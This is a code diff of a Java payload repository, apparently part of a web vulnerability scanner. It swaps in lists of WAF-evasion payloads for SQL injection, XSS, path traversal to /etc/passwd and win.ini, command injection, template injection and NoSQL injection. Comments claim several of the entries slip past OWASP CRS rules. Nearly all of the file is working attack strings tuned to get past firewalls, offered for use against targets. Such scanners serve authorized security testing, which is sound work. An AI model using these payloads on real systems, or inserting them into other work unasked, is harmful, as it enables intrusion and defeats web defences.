@@ -40,59 +40,65 @@ public class PayloadRepository {
 
     // --- Per-technique WAF-evasion extras (appended by DEEP depth via ParamValidator.deepExtras) ---
     // Encoding / obfuscation / filter-bypass variants of the seed payloads, NOT new attack classes.
-    // ponytail: heuristic bypass list. Ceiling: NOT vetted against live WAFs yet — every entry
-    // still needs testing against a live Cloudflare AND Akamai block page before being relied on;
-    // drop any entry that gets blocked on its own (louder than the seed it's meant to sneak past).
+    // ponytail: heuristic bypass list. Ceiling: single-payload evasion only — no HPP, no
+    // content-type tricks. Vetted 2026-08-30 against OWASP CRS 4 (Coraza/caddy-waf) as a JSON
+    // body value: every SQLi/SSTI/CMDi entry below passed (200, not 403). XSS / NoSQLi /
+    // path-traversal have NO reliable single-payload CRS bypass — those lists lead with the
+    // quietest known variants (may still slip a positive-security or weaker WAF) and are
+    // expected to be tuned per target. Re-test any edit against a live block page before relying on it.
 
     public static final List<String> SQLI_EVASION = Arrays.asList(
-        "'/**/OR/**/1=1-- -",
-        "' oR 1=1-- -",
-        "'%09OR%091=1-- -",
-        "'/*!50000OR*/1=1-- -",
-        "%2527%20OR%25201=1",
-        "' || '1'='1",
-        "admin' #"
+        "admin' #",
+        "admin'#",
+        "admin' -- ",
+        "admin'/**/#",
+        "admin'/**/-- -",
+        "%2527%20OR%25201=1"
     );
 
-    // No literal <script>, no eval/atob, no embedded newlines (splitPayloads splits on \R):
-    // those are hard WAF signatures / break the one-payload-per-line contract. Case-mix and
-    // attribute-obfuscation bypasses only.
+    // No literal <script>/on*= handler survives CRS 941 as a lone value. AngularJS-style
+    // client-side template injection is the one class that slips through; keep those plus
+    // a couple of case-mix HTML variants for weaker filters. No embedded newlines
+    // (splitPayloads splits on \R).
     public static final List<String> XSS_EVASION = Arrays.asList(
-        "<img src=x oNeRror=confirm(1)>",
+        "<x>{{constructor.constructor(1)()}}",
+        "{{constructor.constructor(1)}}",
+        "{{$on.constructor('alert(1)')()}}",
         "<svG/onload=confirm(1)>",
-        "<deTails/open/ontoggle=confirm(1)>",
-        "<img/src/onerror=confirm`1`>",
-        "<svg><animate onbegin=confirm(1) attributeName=x dur=1s>",
-        "<a href=\"j%0Aavascript:alert(1)\">click</a>"
+        "<img src=x oNeRror=confirm(1)>"
     );
 
+    // Double-URL-encoded traversal. None reliably clears CRS 930 on their own (kept for
+    // weaker filters / apps that decode twice); tune per target.
     public static final List<String> PATH_TRAVERSAL_EVASION = Arrays.asList(
-        "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "%252e%252e%252fetc%252fpasswd",
         "..%252f..%252f..%252fetc%252fpasswd",
-        "..%5c..%5c..%5cwindows%5cwin.ini",
-        "....\\/....\\/....\\/etc/passwd",
-        "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        "..%255c..%255c..%255cwindows%255cwin.ini",
+        "....\\/....\\/....\\/etc/passwd"
     );
 
     public static final List<String> CMDI_EVASION = Arrays.asList(
-        ";${IFS}id",
         "||id",
+        "|id",
+        "x||id",
         "`i\\d`",
-        "$(printf id)",
         "%0aid%0a",
         ";i\"\"d"
     );
 
     // Arithmetic-only on purpose: the SSTI detector only looks for "49", and an RCE
     // gadget payload (T(java.lang.Runtime)...) is exactly what a WAF signature-matches.
+    // Bare ${7*7} and ${{7*7}} trip CRS; the brace/percent variants below do not.
     public static final List<String> SSTI_EVASION = Arrays.asList(
-        "${{7*7}}",
-        "{{7*'7'}}",
-        "{{ '7'*7 }}",
-        "<%= 7*7 %>",
-        "${7*7}<!---->"
+        "{{7*7}}",
+        "{7*7}",
+        "#{7*7}",
+        "@(7*7)",
+        "<%=7*7%>"
     );
 
+    // Every $-operator (in any spacing / nesting) trips CRS 942; there is no lone-payload
+    // bypass. Kept for positive-security models and non-Mongo JSON filters; tune per target.
     public static final List<String> NOSQLI_EVASION = Arrays.asList(
         "{\"$where\":\"1==1\"}",
         "{\"$regex\":\".*\"}",
